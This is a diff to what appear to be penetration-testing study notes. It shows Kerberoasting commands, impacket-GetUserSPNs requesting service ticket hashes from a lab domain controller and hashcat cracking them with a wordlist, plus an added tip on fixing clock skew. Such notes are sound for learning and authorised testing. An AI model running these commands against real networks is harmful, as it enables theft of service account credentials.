@@ -22,3 +22,5 @@ Using impacket-GetUserSPNs to perform Kerberoasting on Linux to obtain TGS-REP h
 kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/mute
 
 kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.
